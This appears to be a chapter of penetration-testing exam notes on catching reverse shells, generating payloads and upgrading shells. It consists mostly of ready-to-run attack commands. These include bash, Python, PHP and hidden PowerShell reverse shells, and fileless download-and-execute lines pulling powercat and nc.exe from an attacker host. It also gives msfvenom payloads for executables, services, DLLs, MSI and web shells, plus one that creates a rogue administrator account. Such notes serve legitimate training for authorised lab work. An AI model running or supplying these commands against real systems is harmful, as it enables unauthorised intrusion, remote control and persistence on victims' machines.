# 03 · Shells, payloads & upgrades

Turning RCE into a stable, interactive shell — and knowing which payload fits the target.

> 🚩 **EXAM:** a plain `shell_reverse_tcp` caught with `nc` does **not** count as Metasploit use.
> Meterpreter and MSF `exploit`/`post` modules **do** — and you get them on only one machine. Prefer
> non-meterpreter payloads so you don't burn your single MSF machine on a routine shell.

---

## 3.1 Listeners

```bash
nc -nvlp 443                     # standard
rlwrap nc -nvlp 443              # arrow keys / history in the caught shell
while true; do nc -nvlp 443; done   # auto-relisten
```

## 3.2 Reverse shells (Linux target)

```bash
bash -i >& /dev/tcp/<ip>/<port> 0>&1
mkfifo /tmp/f; nc <ip> <port> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f    # nc without -e
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<ip>",<port>));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/bash","-i"])'
php -r '$s=fsockopen("<ip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

> 💡 If the payload is filtered/mangled in transit, base64 it and decode on the target:
> `echo 'bash -i >& /dev/tcp/<ip>/<port> 0>&1' | base64` → run `echo <b64> | base64 -d | bash`.

## 3.3 Reverse shells (Windows target)

```powershell
# PowerShell one-liner (swap ip/port); URL-encode it when delivering via a web param
powershell -NoP -W Hidden -c "$c=New-Object Net.Sockets.TCPClient('<ip>',<port>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=[Text.Encoding]::ASCII.GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"

# PowerCat (fileless load)
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://<ip>/powercat.ps1');powercat -c <ip> -p <port> -e cmd"

# nc.exe (stage it first)
certutil -urlcache -split -f http://<ip>/nc.exe C:\Windows\Temp\nc.exe
C:\Windows\Temp\nc.exe -e cmd.exe <ip> <port>
```

> 💡 Generate any shell interactively at revshells.com — but understand each line; the exam rewards
> knowing *why* it works when the copy-paste one fails.

## 3.4 msfvenom payloads

```bash
# Windows
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=443 -f exe -o shell.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=443 EXITFUNC=thread -f exe-service -o svc.exe   # service privesc
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=443 -f dll -o shell.dll                          # DLL hijack
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=443 -f msi -o shell.msi                          # AlwaysInstallElevated

# Linux
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=443 -f elf -o shell

# Web
msfvenom -p php/reverse_php LHOST=<ip> LPORT=443 -f raw -o shell.php
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=443 -f aspx -o shell.aspx
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=443 -f war -o shell.war      # Tomcat

# Add a Windows admin (when you have SYSTEM but need a login)
msfvenom -p windows/exec CMD='net user hacker Pass123! /add & net localgroup administrators hacker /add' -f exe-service -o adduser.exe
```

> 💡 `exe-service` is the format that survives being launched by the Service Control Manager — use it
> for weak-service-permission and unquoted-path privesc, not a plain `exe`.

## 3.5 Stabilize the shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg            # now Ctrl+C, tab-complete, and editors work

# Fully-interactive via socat (both ends)
# attacker:  socat file:`tty`,raw,echo=0 tcp-listen:<port>
# target:    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<ip>:<port>
```

## 3.6 Exec with credentials (skip dropping a shell)

```bash
evil-winrm -i <ip> -u <user> -p <pass>          # 5985/5986
impacket-wmiexec  DOMAIN/user:pass@<ip>          # semi-interactive, no new service
impacket-psexec   DOMAIN/user:pass@<ip>          # SYSTEM, but noisy (creates a service)
```

## 3.7 Before you move on

- [ ] Shell upgraded to a full TTY (tab-complete, Ctrl-C, working editor).
- [ ] Listener on a likely-allowed egress port (443/80/53) if the first one didn't connect.
- [ ] Grabbed `id`/`whoami /all`, `hostname`, OS/arch — you'll need them for privesc.
- [ ] Saved a second way back in (creds, key, or a second shell) before doing anything risky.
